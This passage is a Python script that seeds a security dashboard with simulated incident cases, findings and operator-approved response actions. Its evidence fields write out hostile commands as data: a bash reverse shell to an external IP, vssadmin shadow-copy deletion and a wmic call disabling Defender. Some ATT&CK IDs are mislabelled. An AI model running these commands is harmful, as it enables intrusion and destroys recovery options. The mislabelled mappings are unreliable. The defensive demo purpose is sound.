"""Inject rich, detailed security incident data and response actions for N.I.R.O. dashboard demonstration."""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from sqlmodel import Session, select

from app.db.session import engine, create_db_and_tables
from app.models.event import Event
from app.models.incident import (
    Incident,
    Finding,
    ResponseAction,
    AgentRun,
    ToolCall,
    AuditEntry,
    Flow,
)


def clear_db(session: Session) -> None:
    print("[*] Clearing existing database tables...")
    session.exec(select(ResponseAction)).all()

    # Delete in order of dependencies
    for model in [ResponseAction, ToolCall, AgentRun, AuditEntry, Finding, Flow, Event, Incident]:
        for item in session.exec(select(model)).all():
            session.delete(item)
    session.commit()
    print("[+] Database cleared successfully.")


def inject_data(session: Session) -> None:
    now = datetime.now(timezone.utc)

    # =========================================================================
    # SCENARIO 1: CRITICAL DATA EXFILTRATION (INC-000001)
    # Status: awaiting_approval (pending operator approval)
    # =========================================================================
    print("[*] Injecting Scenario 1: Critical Database Exfiltration...")

    inc1 = Incident(
        public_id="INC-000001",
        title="Critical Exfiltration of Database Backups",
        incident_type="Data Exfiltration",
        severity="critical",
        confidence=0.98,
        status="awaiting_approval",
        source_ip="192.168.12.44",
        destination_ip="198.51.100.12",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=2),
        last_seen=now - timedelta(minutes=15),
        summary="High-volume database server outbound query followed by unauthorized transmission to an external host. 15.2 GB of compressed PostgreSQL backup logs exfiltrated over port 443.",
        llm_summary="Critical data exfiltration detected from DB-Prod-01 (192.168.12.44) to suspected rogue external IP 198.51.100.12. The transaction moved 15.2 GB of compressed PostgreSQL backup logs (.sql.tar.gz) over an encrypted HTTPS connection on port 443. The action is currently in an uncontained state pending operator containment approval.",
        llm_report=(
            "# Incident Response Case File: INC-000001\n\n"
            "## Executive Summary\n"
            "On 2026-06-24, the N.I.R.O. orchestration engine flagged a massive outbound data flow from `DB-Prod-01` to an external IP in Russia. "
            "The volume (15.2 GB) and connection duration (45 minutes) deviate heavily from the baseline established for this host.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Exfiltration (TA0009)\n"
            "- **Technique**: Exfiltration Over Web Service (T1567)\n"
            "- **Destination IP**: `198.51.100.12` (Host: backup.ru-cdn-dns.net, suspected exfiltration dropzone)\n\n"
            "## Impact Assessment\n"
            "The compromised database contains customer PII and encrypted password hashes. "
            "Containment is highly recommended to block outbound connections immediately."
        ),
        mitre_mapping=[
            {"tactic": "Exfiltration", "technique": "Exfiltration Over Web Service", "id": "T1567"},
            {"tactic": "Exfiltration", "technique": "Exfiltration Over C2 Channel", "id": "T1048"}
        ],
        asset_context={
            "hostname": "DB-Prod-01",
            "role": "Primary Database Server",
            "tier": "Tier-0 Critical Infrastructure",
            "os": "Ubuntu 22.04 LTS",
            "segment": "Internal DB-VLAN"
        },
        evidence=["NetFlow event 8821: 15.2 GB outbound to 198.51.100.12", "Suricata alert: ET MALWARE Possible Exfil Beacon", "Baseline deviation: 4720x normal upload volume"],
        recommended_actions=["Block outbound IP 198.51.100.12 at perimeter firewall", "Isolate DB-Prod-01 from network", "Capture forensic memory image of DB-Prod-01", "Notify CISO and legal team immediately"],
    )
    session.add(inc1)
    session.commit()
    session.refresh(inc1)

    f1 = Finding(
        incident_id=inc1.id,
        detector_id="ml-detector-v1",
        detector_version="1.1.0",
        incident_type="Data Exfiltration",
        severity="critical",
        confidence=0.98,
        source_ip="192.168.12.44",
        destination_ip="198.51.100.12",
        first_seen=now - timedelta(hours=2),
        last_seen=now - timedelta(minutes=15),
        evidence_summary="IsolationForest anomaly score 0.97. 15.2 GB outbound over 45 minutes to Russian IP.",
        related_event_ids=["8821", "8822", "8823"],
        ml_score=0.97,
        recommended_playbooks=["data-exfil-containment", "db-forensics-capture"],
    )
    session.add(f1)

    # Response actions for INC-000001 (awaiting approval = pending)
    ra1 = ResponseAction(
        incident_id=inc1.id,
        action_type="Block Outbound Host Destination",
        plugin="simulation",
        arguments={"source_ip": "192.168.12.44", "destination_ip": "198.51.100.12", "port": 443},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra2 = ResponseAction(
        incident_id=inc1.id,
        action_type="Isolate Primary Database Server",
        plugin="simulation",
        arguments={"hostname": "DB-Prod-01", "ip": "192.168.12.44", "network_segment": "Database-VLAN"},
        risk="high",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra3 = ResponseAction(
        incident_id=inc1.id,
        action_type="Capture Forensic Memory Snapshot",
        plugin="simulation",
        arguments={"hostname": "DB-Prod-01", "method": "LiME kernel module"},
        risk="low",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra1)
    session.add(ra2)
    session.add(ra3)

    # =========================================================================
    # SCENARIO 2: ACTIVE C2 BEACONING (INC-000002)
    # Status: containing — partially approved, some actions completed
    # =========================================================================
    print("[*] Injecting Scenario 2: Active C2 Beaconing...")

    inc2 = Incident(
        public_id="INC-000002",
        title="Active Command and Control Beaconing (Cobalt Strike)",
        incident_type="Command and Control",
        severity="high",
        confidence=0.94,
        status="containing",
        source_ip="10.10.5.88",
        destination_ip="203.0.113.80",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=5),
        last_seen=now - timedelta(minutes=3),
        summary="Workstation WS-Finance-09 is actively beaconing to a known Cobalt Strike C2 server at 60-second intervals. Malleable C2 profile detected via JA3 fingerprint matching.",
        llm_summary="Cobalt Strike C2 beacon traffic detected from WS-Finance-09 (10.10.5.88). The traffic exhibits periodic 60-second intervals consistent with CS default malleable C2 profiles. JA3 fingerprint 51b7ad5a09e7d00fbfaeaab03d1680c5 matches known Cobalt Strike listener.",
        llm_report=(
            "# Incident Response Case File: INC-000002\n\n"
            "## Executive Summary\n"
            "A Finance department workstation is actively controlled via Cobalt Strike C2 beacon. "
            "The C2 server `203.0.113.80` is hosted on infrastructure previously attributed to APT-41.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Command and Control (TA0011)\n"
            "- **Technique**: Application Layer Protocol (T1071.001)\n"
            "- **JA3 Hash**: 51b7ad5a09e7d00fbfaeaab03d1680c5 (Cobalt Strike)\n"
            "- **Beacon Interval**: 60s with ±15% jitter\n\n"
            "## Containment Status\n"
            "C2 IP block has been approved and applied. Host isolation pending secondary review."
        ),
        mitre_mapping=[
            {"tactic": "Command and Control", "technique": "Application Layer Protocol: Web Protocols", "id": "T1071.001"},
            {"tactic": "Persistence", "technique": "Boot or Logon Autostart Execution", "id": "T1547"},
            {"tactic": "Defense Evasion", "technique": "Obfuscated Files or Information", "id": "T1027"},
        ],
        asset_context={
            "hostname": "WS-Finance-09",
            "role": "Finance Analyst Workstation",
            "tier": "Tier-2",
            "os": "Windows 11 Pro 23H2",
            "user": "m.chen@corp.local",
            "segment": "Finance-VLAN"
        },
        evidence=[
            "Zeek conn.log: 10.10.5.88 -> 203.0.113.80:443, 60s intervals, 42 connections",
            "JA3 match: 51b7ad5a09e7d00fbfaeaab03d1680c5 (Cobalt Strike beacon)",
            "EDR: rundll32.exe injected svchost.exe PID 4821"
        ],
        recommended_actions=["Block C2 IP 203.0.113.80 at firewall", "Isolate WS-Finance-09", "Kill malicious process PID 4821", "Reset credentials for m.chen@corp.local"],
    )
    session.add(inc2)
    session.commit()
    session.refresh(inc2)

    f2 = Finding(
        incident_id=inc2.id,
        detector_id="suricata-et-pro",
        detector_version="6.0.23",
        incident_type="Command and Control",
        severity="high",
        confidence=0.94,
        source_ip="10.10.5.88",
        destination_ip="203.0.113.80",
        first_seen=now - timedelta(hours=5),
        last_seen=now - timedelta(minutes=3),
        evidence_summary="Suricata ET rule 2027865 matched: ETPRO MALWARE Cobalt Strike Beacon Observed. 42 beacon connections in 42 minutes.",
        related_event_ids=["3301", "3302", "3303", "3304"],
        ml_score=0.91,
        recommended_playbooks=["c2-beacon-response", "host-isolation-windows"],
    )
    session.add(f2)

    # Mixed statuses for C2 incident actions
    ra4 = ResponseAction(
        incident_id=inc2.id,
        action_type="Block C2 Host IP Address",
        plugin="simulation",
        arguments={"destination_ip": "203.0.113.80"},
        risk="low",
        status="approved",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
        approved_by="operator",
        approval_timestamp=now - timedelta(hours=4, minutes=30),
    )
    ra5 = ResponseAction(
        incident_id=inc2.id,
        action_type="Isolate Workstation WS-Finance-09",
        plugin="simulation",
        arguments={"hostname": "WS-Finance-09", "ip": "10.10.5.88"},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra6 = ResponseAction(
        incident_id=inc2.id,
        action_type="Kill Malicious Process (PID 4821)",
        plugin="simulation",
        arguments={"hostname": "WS-Finance-09", "pid": 4821, "process_name": "svchost.exe (injected)"},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ResponsePlannerAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "Process terminated successfully"}),
    )
    session.add(ra4)
    session.add(ra5)
    session.add(ra6)

    # =========================================================================
    # SCENARIO 3: INTERNAL PORT SCAN (INC-000003)
    # Status: mitigated — all actions completed
    # =========================================================================
    print("[*] Injecting Scenario 3: Internal Port Scan...")

    inc3 = Incident(
        public_id="INC-000003",
        title="Horizontal Internal Port Scan — IT Asset Discovery",
        incident_type="Reconnaissance",
        severity="medium",
        confidence=0.88,
        status="mitigated",
        source_ip="10.10.0.15",
        destination_ip="10.10.0.0/24",
        assigned_to="ThreatHunterAgent",
        first_seen=now - timedelta(hours=8),
        last_seen=now - timedelta(hours=7),
        summary="IT-Admin-01 performed an unauthorized horizontal port scan of the entire 10.10.0.0/24 subnet, probing ports 22, 80, 443, 3389, and 8080.",
        llm_summary="Port scan activity from IT-Admin-01 (10.10.0.15) targeting the 10.10.0.0/24 internal subnet. The scan covered 254 hosts and probed 5 common administrative ports. While likely administrative, the scan occurred outside authorized change window hours, triggering the alert.",
        llm_report=(
            "# Incident Response Case File: INC-000003\n\n"
            "## Executive Summary\n"
            "An internal host IT-Admin-01 conducted a port scan outside of authorized maintenance windows. "
            "While attributed to a legitimate user account, the timing and undocumented nature of the scan raise policy violation concerns.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Discovery (TA0007)\n"
            "- **Technique**: Network Service Discovery (T1046)\n"
            "- **Scan Scope**: 10.10.0.0/24 (254 hosts, ports 22, 80, 443, 3389, 8080)\n\n"
            "## Disposition\n"
            "User j.harris@corp.local confirmed as the scan originator. Policy warning issued. Incident closed as policy violation."
        ),
        mitre_mapping=[
            {"tactic": "Discovery", "technique": "Network Service Discovery", "id": "T1046"},
            {"tactic": "Discovery", "technique": "Remote System Discovery", "id": "T1018"},
        ],
        asset_context={
            "hostname": "IT-Admin-01",
            "role": "IT Administrator Workstation",
            "tier": "Tier-1",
            "user": "j.harris@corp.local",
            "segment": "Management-VLAN"
        },
        evidence=[
            "Zeek conn.log: 254 SYN probes from 10.10.0.15 within 38 seconds",
            "Ports scanned: 22, 80, 443, 3389, 8080",
            "User confirmed: j.harris ran nmap -sS 10.10.0.0/24"
        ],
        recommended_actions=["Issue policy warning to j.harris@corp.local", "Log event in audit trail", "Schedule mandatory security awareness training"],
    )
    session.add(inc3)
    session.commit()
    session.refresh(inc3)

    f3 = Finding(
        incident_id=inc3.id,
        detector_id="ml-detector-v1",
        detector_version="1.1.0",
        incident_type="Reconnaissance",
        severity="medium",
        confidence=0.88,
        source_ip="10.10.0.15",
        destination_ip="10.10.0.0/24",
        first_seen=now - timedelta(hours=8),
        last_seen=now - timedelta(hours=7),
        evidence_summary="254 SYN connection attempts in 38 seconds. IsolationForest anomaly score 0.85.",
        ml_score=0.85,
        recommended_playbooks=["internal-recon-response"],
    )
    session.add(f3)

    ra7 = ResponseAction(
        incident_id=inc3.id,
        action_type="Issue Policy Violation Warning",
        plugin="simulation",
        arguments={"user": "j.harris@corp.local", "policy": "Unauthorized Network Scanning Policy"},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ThreatHunterAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "Warning issued and logged in HR system"}),
    )
    ra8 = ResponseAction(
        incident_id=inc3.id,
        action_type="Rate-Limit Source Host Outbound Connections",
        plugin="simulation",
        arguments={"source_ip": "10.10.0.15", "max_connections_per_second": 5, "duration_hours": 24},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ThreatHunterAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "Rate limit applied on perimeter switch ACL"}),
    )
    session.add(ra7)
    session.add(ra8)

    # =========================================================================
    # SCENARIO 4: RANSOMWARE EARLY STAGE (INC-000004)
    # Status: investigating — active triage
    # =========================================================================
    print("[*] Injecting Scenario 4: Ransomware Staging...")

    inc4 = Incident(
        public_id="INC-000004",
        title="Ransomware Pre-Encryption Stage — Shadow Copy Deletion",
        incident_type="Ransomware",
        severity="critical",
        confidence=0.96,
        status="investigating",
        source_ip="10.20.3.71",
        destination_ip="10.20.0.0/16",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(minutes=45),
        last_seen=now - timedelta(minutes=2),
        summary="WS-Dev-23 executed vssadmin.exe to delete Volume Shadow Copies. Followed by wmic.exe disabling Windows Defender. Ransomware pre-encryption staging detected with high confidence.",
        llm_summary="Pre-ransomware activity detected on WS-Dev-23 (10.20.3.71). Shadow copy deletion via vssadmin.exe and Windows Defender disablement via wmic.exe strongly indicate active ransomware staging. Lateral movement attempts to file shares observed. Immediate isolation recommended.",
        llm_report=(
            "# Incident Response Case File: INC-000004\n\n"
            "## ⚠️ CRITICAL — ACTIVE THREAT\n"
            "Ransomware pre-encryption phase detected. Immediate action required.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Impact (TA0040), Defense Evasion (TA0005)\n"
            "- **Technique**: Inhibit System Recovery (T1490), Impair Defenses (T1562)\n"
            "- **Observed Commands**:\n"
            "  - `vssadmin.exe delete shadows /all /quiet`\n"
            "  - `wmic.exe /namespace:\\\\root\\Microsoft\\Windows\\Defender path MSFT_MpPreference call DisableRealtimeMonitoring true`\n\n"
            "## Lateral Movement\n"
            "SMB connections to \\\\FILESERVER-01\\Shares and \\\\HR-FILES\\Documents detected from the same host."
        ),
        mitre_mapping=[
            {"tactic": "Impact", "technique": "Inhibit System Recovery", "id": "T1490"},
            {"tactic": "Defense Evasion", "technique": "Impair Defenses: Disable or Modify Tools", "id": "T1562.001"},
            {"tactic": "Lateral Movement", "technique": "SMB/Windows Admin Shares", "id": "T1021.002"},
        ],
        asset_context={
            "hostname": "WS-Dev-23",
            "role": "Developer Workstation",
            "tier": "Tier-2",
            "user": "a.voronov@corp.local",
            "segment": "Dev-VLAN"
        },
        evidence=[
            "EDR: vssadmin.exe delete shadows /all /quiet (PID 5512)",
            "EDR: wmic.exe DisableRealtimeMonitoring true",
            "Zeek smb.log: 3 lateral SMB connections to FILESERVER-01 and HR-FILES",
            "Windows Event 4688: Unusual process creation chain explorer.exe -> cmd.exe -> vssadmin.exe"
        ],
        recommended_actions=["IMMEDIATELY isolate WS-Dev-23", "Block SMB traffic from 10.20.3.71", "Snapshot affected file servers", "Engage IR team"],
    )
    session.add(inc4)
    session.commit()
    session.refresh(inc4)

    f4 = Finding(
        incident_id=inc4.id,
        detector_id="suricata-et-pro",
        detector_version="6.0.23",
        incident_type="Ransomware",
        severity="critical",
        confidence=0.96,
        source_ip="10.20.3.71",
        destination_ip="10.20.0.0/16",
        first_seen=now - timedelta(minutes=45),
        last_seen=now - timedelta(minutes=2),
        evidence_summary="Shadow copy deletion + AV disable sequence. Critical ransomware pre-encryption indicators with 96% confidence.",
        ml_score=0.96,
        recommended_playbooks=["ransomware-immediate-isolation", "file-server-snapshot"],
    )
    session.add(f4)

    ra9 = ResponseAction(
        incident_id=inc4.id,
        action_type="Emergency Host Isolation — WS-Dev-23",
        plugin="simulation",
        arguments={"hostname": "WS-Dev-23", "ip": "10.20.3.71", "priority": "critical", "method": "VLAN reassignment"},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra10 = ResponseAction(
        incident_id=inc4.id,
        action_type="Block SMB Traffic from Dev-VLAN",
        plugin="simulation",
        arguments={"source_vlan": "Dev-VLAN", "destination_shares": ["FILESERVER-01", "HR-FILES"], "port": 445},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra11 = ResponseAction(
        incident_id=inc4.id,
        action_type="Create File Server Snapshot",
        plugin="simulation",
        arguments={"targets": ["FILESERVER-01", "HR-FILES"], "method": "VSS snapshot via backup agent"},
        risk="low",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra9)
    session.add(ra10)
    session.add(ra11)

    # =========================================================================
    # SCENARIO 5: BRUTE FORCE CREDENTIAL ATTACK (INC-000005)
    # Status: awaiting_approval
    # =========================================================================
    print("[*] Injecting Scenario 5: SSH Brute Force Attack...")

    inc5 = Incident(
        public_id="INC-000005",
        title="SSH Brute Force Attack on Exposed Jump Server",
        incident_type="Credential Access",
        severity="high",
        confidence=0.99,
        status="awaiting_approval",
        source_ip="45.33.32.156",
        destination_ip="203.0.113.200",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=1, minutes=20),
        last_seen=now - timedelta(minutes=8),
        summary="External IP 45.33.32.156 performed 3,847 SSH authentication attempts against jump server JUMP-01 in 12 minutes. One successful login detected at attempt 3291.",
        llm_summary="SSH brute force attack from 45.33.32.156 (known Shodan scanner IP). Attack achieved successful authentication at 23:14 UTC. Source is a Tor exit node. Account 'svc-backup' may be compromised. Password spraying pattern suggests automated tooling (Hydra or Medusa).",
        llm_report=(
            "# Incident Response Case File: INC-000005\n\n"
            "## Executive Summary\n"
            "External brute force attack successfully breached the 'svc-backup' service account on JUMP-01.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Credential Access (TA0006)\n"
            "- **Technique**: Brute Force: Password Spraying (T1110.003)\n"
            "- **Source IP**: 45.33.32.156 (Tor exit node, previously seen in BlueLeaks breach)\n"
            "- **Attack Rate**: 320 attempts/minute\n\n"
            "## Successful Breach\n"
            "Account `svc-backup` logged in successfully at 23:14:07 UTC. "
            "Post-auth commands: `whoami`, `id`, `cat /etc/passwd`. Privilege escalation attempt in progress."
        ),
        mitre_mapping=[
            {"tactic": "Credential Access", "technique": "Brute Force: Password Spraying", "id": "T1110.003"},
            {"tactic": "Initial Access", "technique": "Valid Accounts: Local Accounts", "id": "T1078.003"},
            {"tactic": "Discovery", "technique": "Account Discovery", "id": "T1087"},
        ],
        asset_context={
            "hostname": "JUMP-01",
            "role": "SSH Jump Server (Bastion Host)",
            "tier": "Tier-1 DMZ",
            "os": "Debian 12 Bookworm",
            "exposed_port": 22,
            "segment": "DMZ"
        },
        evidence=[
            "auth.log: 3847 FAILED password for various users from 45.33.32.156",
            "auth.log: Accepted publickey svc-backup from 45.33.32.156 port 51234",
            "AbuseIPDB: 45.33.32.156 — 94% confidence malicious",
            "Process: bash -i >& /dev/tcp/45.33.32.156/4444 0>&1 (reverse shell attempt)"
        ],
        recommended_actions=["Block 45.33.32.156 at edge firewall", "Lock svc-backup account immediately", "Rotate all SSH keys on JUMP-01", "Enable fail2ban with strict rules", "Audit all post-auth commands"],
    )
    session.add(inc5)
    session.commit()
    session.refresh(inc5)

    f5 = Finding(
        incident_id=inc5.id,
        detector_id="suricata-et-pro",
        detector_version="6.0.23",
        incident_type="Credential Access",
        severity="high",
        confidence=0.99,
        source_ip="45.33.32.156",
        destination_ip="203.0.113.200",
        first_seen=now - timedelta(hours=1, minutes=20),
        last_seen=now - timedelta(minutes=8),
        evidence_summary="3847 failed SSH attempts + 1 successful auth. Automated tool pattern detected.",
        ml_score=0.99,
        recommended_playbooks=["ssh-brute-force-response", "account-lockout-escalation"],
    )
    session.add(f5)

    ra12 = ResponseAction(
        incident_id=inc5.id,
        action_type="Block Source IP at Edge Firewall",
        plugin="simulation",
        arguments={"source_ip": "45.33.32.156", "rule": "DROP", "protocol": "tcp", "port": 22},
        risk="low",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra13 = ResponseAction(
        incident_id=inc5.id,
        action_type="Lock Compromised Account svc-backup",
        plugin="simulation",
        arguments={"username": "svc-backup", "hostname": "JUMP-01", "method": "passwd -l"},
        risk="low",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra14 = ResponseAction(
        incident_id=inc5.id,
        action_type="Rotate All SSH Host Keys — JUMP-01",
        plugin="simulation",
        arguments={"hostname": "JUMP-01", "revoke_existing_keys": True},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra12)
    session.add(ra13)
    session.add(ra14)

    # =========================================================================
    # SCENARIO 6: INSIDER THREAT — DATA STAGING (INC-000006)
    # Status: closed/resolved
    # =========================================================================
    print("[*] Injecting Scenario 6: Insider Threat Data Staging...")

    inc6 = Incident(
        public_id="INC-000006",
        title="Insider Threat: Unusual Data Staging to Personal Cloud Storage",
        incident_type="Insider Threat",
        severity="high",
        confidence=0.87,
        status="resolved",
        source_ip="10.10.8.22",
        destination_ip="52.96.0.0/14",
        assigned_to="ThreatHunterAgent",
        first_seen=now - timedelta(days=2),
        last_seen=now - timedelta(days=1, hours=6),
        summary="HR-Analyst-04 uploaded 2.8 GB of sensitive HR documents to a personal OneDrive account 3 days before her scheduled departure date. DLP alert triggered.",
        llm_summary="Employee r.thompson@corp.local (HR-Analyst-04) staged 2.8 GB of sensitive documents including salary data, performance reviews, and org charts to personal OneDrive the week of her resignation effective date. Behavior is consistent with pre-departure data theft.",
        llm_report=(
            "# Incident Response Case File: INC-000006\n\n"
            "## Executive Summary\n"
            "DLP alert triggered on anomalous cloud storage upload from HR-Analyst-04. "
            "Document classification confirms the data includes Tier-1 HR sensitive records.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Exfiltration (TA0009)\n"
            "- **Technique**: Exfiltration to Cloud Storage (T1567.002)\n"
            "- **Upload Volume**: 2.8 GB (2,847 files) to personal OneDrive\n"
            "- **Employee Status**: Resignation submitted 4 days prior\n\n"
            "## Resolution\n"
            "Legal hold placed on employee device. HR and Legal notified. Employee access revoked."
        ),
        mitre_mapping=[
            {"tactic": "Exfiltration", "technique": "Exfiltration to Cloud Storage", "id": "T1567.002"},
            {"tactic": "Collection", "technique": "Data from Local System", "id": "T1005"},
        ],
        asset_context={
            "hostname": "HR-Analyst-04-Laptop",
            "role": "HR Analyst Workstation",
            "user": "r.thompson@corp.local",
            "segment": "Corporate-VLAN",
            "departure_date": "2026-06-27"
        },
        evidence=[
            "DLP alert: 2,847 file uploads to personal-onedrive.live.com",
            "Classification: 127 files marked CONFIDENTIAL-HR",
            "Network flow: 2.8 GB to 52.96.0.0/14 (Microsoft consumer cloud)",
            "Browser history: onedrive.live.com login with personal account at 18:23 local"
        ],
        recommended_actions=["Revoke all access immediately", "Place legal hold on device", "Engage legal and HR", "Preserve DLP logs as evidence"],
    )
    session.add(inc6)
    session.commit()
    session.refresh(inc6)

    ra15 = ResponseAction(
        incident_id=inc6.id,
        action_type="Revoke All User Access",
        plugin="simulation",
        arguments={"username": "r.thompson", "systems": ["AD", "VPN", "Office365", "Jira"]},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=True,
        proposed_by="ThreatHunterAgent",
        approved_by="operator",
        approval_timestamp=now - timedelta(days=1, hours=18),
        result=json.dumps({"success": True, "message": "All access revoked across 4 systems"}),
    )
    ra16 = ResponseAction(
        incident_id=inc6.id,
        action_type="Place Legal Hold on Device",
        plugin="simulation",
        arguments={"hostname": "HR-Analyst-04-Laptop", "evidence_case": "LEGAL-2026-0049"},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=True,
        proposed_by="ThreatHunterAgent",
        approved_by="operator",
        approval_timestamp=now - timedelta(days=1, hours=18),
        result=json.dumps({"success": True, "message": "Device image captured and transferred to legal hold storage"}),
    )
    session.add(ra15)
    session.add(ra16)

    # =========================================================================
    # SCENARIO 7: SUPPLY CHAIN ATTACK (INC-000007)
    # Status: awaiting_approval
    # =========================================================================
    print("[*] Injecting Scenario 7: Supply Chain Attack via Compromised NPM Package...")

    inc7 = Incident(
        public_id="INC-000007",
        title="Supply Chain Attack: Compromised NPM Package in CI/CD Pipeline",
        incident_type="Supply Chain",
        severity="critical",
        confidence=0.91,
        status="awaiting_approval",
        source_ip="10.30.1.5",
        destination_ip="91.108.4.0/22",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=3),
        last_seen=now - timedelta(minutes=20),
        summary="CI/CD build server fetched malicious version of npm package 'event-stream' (v5.0.1). The malicious package contains a crypto-miner and credential harvester. Build artifacts may be contaminated.",
        llm_summary="Supply chain compromise detected. CI server JENKINS-01 installed event-stream@5.0.1 which contains malicious code. The package harvests AWS credentials from environment variables and beacons to Telegram API. 12 build artifacts may contain the payload.",
        llm_report=(
            "# Incident Response Case File: INC-000007\n\n"
            "## Executive Summary\n"
            "Malicious NPM package detected in CI/CD build pipeline. Artifacts deployed to staging may be backdoored.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Initial Access (TA0001), Exfiltration (TA0009)\n"
            "- **Technique**: Supply Chain Compromise (T1195.002)\n"
            "- **Package**: event-stream@5.0.1 (malicious, published 2026-06-22)\n"
            "- **Beacon**: POST to api.telegram.org (data exfiltration)\n\n"
            "## Affected Builds\n"
            "Builds #4421 through #4433 used the compromised package. "
            "Artifacts include Docker images pushed to ECR."
        ),
        mitre_mapping=[
            {"tactic": "Initial Access", "technique": "Supply Chain Compromise: Compromise Software Dependencies", "id": "T1195.002"},
            {"tactic": "Exfiltration", "technique": "Exfiltration Over Web Service: Exfiltration to Code Repository", "id": "T1567.001"},
            {"tactic": "Impact", "technique": "Resource Hijacking", "id": "T1496"},
        ],
        asset_context={
            "hostname": "JENKINS-01",
            "role": "CI/CD Build Server",
            "tier": "Tier-1",
            "segment": "DevOps-VLAN",
            "affected_builds": ["#4421", "#4422", "#4423", "#4424", "#4425"]
        },
        evidence=[
            "npm audit: CRITICAL severity in event-stream@5.0.1",
            "Network: POST requests to api.telegram.org from JENKINS-01",
            "Credential harvest: AWS_ACCESS_KEY_ID exfiltrated in base64 payload",
            "Docker: 12 images pushed to ECR from compromised builds"
        ],
        recommended_actions=["Immediately block JENKINS-01 network egress", "Rotate all secrets/API keys in CI environment", "Pull all contaminated Docker images from ECR", "Audit all builds #4421-#4433"],
    )
    session.add(inc7)
    session.commit()
    session.refresh(inc7)

    ra17 = ResponseAction(
        incident_id=inc7.id,
        action_type="Block CI Server Outbound Traffic",
        plugin="simulation",
        arguments={"hostname": "JENKINS-01", "allow_list": ["internal-npm-registry.corp.local"], "block_internet": True},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra18 = ResponseAction(
        incident_id=inc7.id,
        action_type="Rotate All CI/CD Secrets and API Keys",
        plugin="simulation",
        arguments={"scope": "JENKINS-01", "secrets": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "NPM_TOKEN", "GITHUB_TOKEN"]},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra19 = ResponseAction(
        incident_id=inc7.id,
        action_type="Quarantine Contaminated Docker Images from ECR",
        plugin="simulation",
        arguments={"registry": "ecr.us-east-1.amazonaws.com", "images_to_remove": ["app:4421", "app:4422", "app:4423", "app:4424", "app:4425"]},
        risk="high",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra17)
    session.add(ra18)
    session.add(ra19)

    # =========================================================================
    # SCENARIO 8: DNS TUNNELING (INC-000008)
    # Status: containing
    # =========================================================================
    print("[*] Injecting Scenario 8: DNS Tunneling Data Exfiltration...")

    inc8 = Incident(
        public_id="INC-000008",
        title="DNS Tunneling — Covert Data Exfiltration via DNS Queries",
        incident_type="Covert Channel",
        severity="high",
        confidence=0.93,
        status="containing",
        source_ip="10.10.7.33",
        destination_ip="8.8.8.8",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=12),
        last_seen=now - timedelta(hours=1),
        summary="Workstation WS-Legal-07 is generating extremely high volumes of DNS TXT queries to randomized subdomains of tunnel.malicious-ns.com. Pattern matches DNS tunneling tool (iodine or DNScat2). 240 MB of data estimated exfiltrated.",
        llm_summary="DNS tunneling detected from WS-Legal-07. High entropy subdomain queries to tunnel.malicious-ns.com at 12,000 queries/hour. Shannon entropy of subdomains averages 4.8 bits/char, consistent with base64-encoded data. Volume suggests 240 MB total exfiltrated.",
        llm_report=(
            "# Incident Response Case File: INC-000008\n\n"
            "## Executive Summary\n"
            "Covert DNS tunneling channel detected from Legal department workstation. "
            "Approximately 240 MB of data has been tunneled out over 11 hours.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Exfiltration (TA0009), Command and Control (TA0011)\n"
            "- **Technique**: Exfiltration Over Alternative Protocol: DNS (T1048.003)\n"
            "- **Query Volume**: 132,000 DNS TXT queries in 11 hours\n"
            "- **Entropy**: 4.8 bits/char (baseline: 2.1 bits/char)\n\n"
            "## Containment\n"
